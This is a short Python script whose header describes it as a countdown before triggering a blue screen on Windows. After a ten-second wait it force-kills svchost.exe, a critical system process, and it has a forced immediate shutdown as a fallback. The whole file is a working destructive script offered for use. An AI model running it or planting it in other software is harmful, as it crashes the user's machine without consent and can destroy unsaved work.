# -*- coding: utf-8 -*-
# filename          : main.py
# description       : Countdown before triggering BSOD on Windows
# author            : Ian Ault
# email             : liketoaccess@protonmail.com
# date              : 09-14-2022
# version           : v1.0
# usage             : python main.py
# notes             : This file should not be run directly
# license           : MIT
# py version        : 3.10.2 (must run on 3.6 or higher)
#==============================================================================
import os


def main():
	os.system("timeout /t 10 /nobreak")
	try:
		os.system("taskkill /IM svchost.exe /F")
	except OSError:
		os.system("shutdown /s /t 0 /f")


if __name__ == "__main__":
	main()
